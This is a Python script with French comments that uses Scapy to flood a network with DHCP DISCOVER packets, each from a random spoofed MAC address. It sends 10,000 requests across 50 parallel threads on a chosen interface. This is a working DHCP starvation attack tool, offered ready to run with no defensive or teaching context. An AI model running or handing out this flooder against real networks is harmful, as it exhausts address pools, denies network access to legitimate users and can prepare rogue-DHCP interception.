import time
import threading
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether


# Fonction pour envoyer un message DHCP DISCOVER
def send_dhcp_discover(iface):
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68,
                                                                                                    dport=67) / BOOTP(
        op=1, chaddr=RandMAC()) / DHCP(options=[("message-type", "discover"), "end"])

    sendp(dhcp_discover, iface=iface, verbose=False)  # Envoi de la requête


# Fonction pour envoyer un grand nombre de requêtes DHCP
def send_bulk_dhcp_discover(iface, num_requests, threads=10):
    threads_list = []

    # Nombre de requêtes par thread
    requests_per_thread = num_requests // threads

    # Lancer plusieurs threads pour envoyer les requêtes
    for i in range(threads):
        thread = threading.Thread(target=send_multiple_requests, args=(iface, requests_per_thread))
        threads_list.append(thread)
        thread.start()

    # Attendre la fin de tous les threads
    for thread in threads_list:
        thread.join()

    print(f"{num_requests} requêtes DHCP DISCOVER envoyées.")


# Fonction pour envoyer plusieurs requêtes DHCP
def send_multiple_requests(iface, num_requests):
    for _ in range(num_requests):
        send_dhcp_discover(iface)


# Programme principal
if __name__ == "__main__":
    iface = "eth0"  # Remplace par l'interface réseau de ton choix
    num_requests = 10000  # Nombre de requêtes DHCP à envoyer
    threads = 50  # Nombre de threads parallèles à utiliser pour l'envoi

    start_time = time.time()

    # Envoi des requêtes DHCP en masse
    send_bulk_dhcp_discover(iface, num_requests, threads)

    end_time = time.time()
    print(f"Temps total pour envoyer {num_requests} requêtes : {end_time - start_time:.2f} secondes.")
